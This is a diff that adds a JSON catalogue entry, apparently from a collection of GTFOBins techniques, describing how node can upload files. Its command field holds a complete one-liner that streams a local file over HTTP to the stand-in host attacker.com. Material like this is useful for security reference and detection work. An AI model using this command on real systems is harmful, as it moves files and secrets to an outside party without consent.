@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-node-upload",
+  "name": "GTFOBins · node (upload)",
+  "command": "node -e 'require(\"fs\").createReadStream(\"/path/to/input-file\").pipe(require(\"http\").request(\"http://attacker.com/path/to/output-file\"))'",
+  "description": "Use node to upload via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "node",
+    "upload"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/node/#upload",
+  "upstream_id": "node/upload/0",
+  "category": "gtfobins",
+  "subcategory": "file-upload",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/node/"
+    }
+  ]
+}
